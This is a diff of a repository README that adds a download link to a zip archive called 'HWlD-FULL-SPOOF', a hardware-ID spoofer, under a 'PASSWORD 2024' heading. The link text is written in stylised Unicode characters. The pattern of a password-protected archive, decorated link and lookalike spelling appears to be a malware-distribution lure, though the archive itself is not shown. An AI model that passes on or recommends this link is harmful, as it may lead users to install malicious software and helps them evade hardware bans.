@@ -2,7 +2,7 @@
 
 ## PASSWORD 2024 
 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/MartLehtma/HWlD-FULL-SPOOF/releases/download/HWlD-FULL-SPOOF/HWlD-FULL-SPOOF.zip)
 
 ![maxresdefault (32) (1)](https://github.com/MartLehtma/HWlD-FULL-SPOOF/assets/73334618/cd37b31a-93d0-4c66-a489-e5adc870d8c3)
 
